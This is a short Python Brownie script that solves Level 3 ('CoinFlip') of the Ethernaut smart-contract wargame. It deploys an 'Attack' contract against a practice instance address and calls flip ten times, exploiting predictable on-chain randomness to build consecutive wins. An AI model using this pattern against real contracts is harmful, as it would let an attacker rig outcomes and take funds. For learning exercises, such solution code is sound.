from scripts.helpful_scripts import get_account
from brownie import accounts, config, interface, Attack

# Level 3 - CoinFlip - instance generated (for the level 3 'CoinFlip' contract)
ETHERNAUT_INSTANCE = "0xdc06FD5A0D5aa673A123db5A6Fc041090E063D0A"


def main():
    # Ethernaut Instance
    contract = ETHERNAUT_INSTANCE
    player = get_account()

    # To deploy the attacker contract: To interact with the coinflip contract (i.e. Acting as a proxy)
    # Passing in coinflip_contract address for the constructor to initialise the contract.
    attack_coinflip = Attack.deploy(contract, {"from": player})

    print(f"Deployed - attack address is: {attack_coinflip.address}")

    coinflip_interface = interface.ICoinFlip(contract)

    for i in range(10):
        attack_coinflip.flip(
            {"from": player, "gas_limit": 10000000, "allow_revert": True}
        )
        print("Consecutive wins: ", coinflip_interface.consecutiveWins())
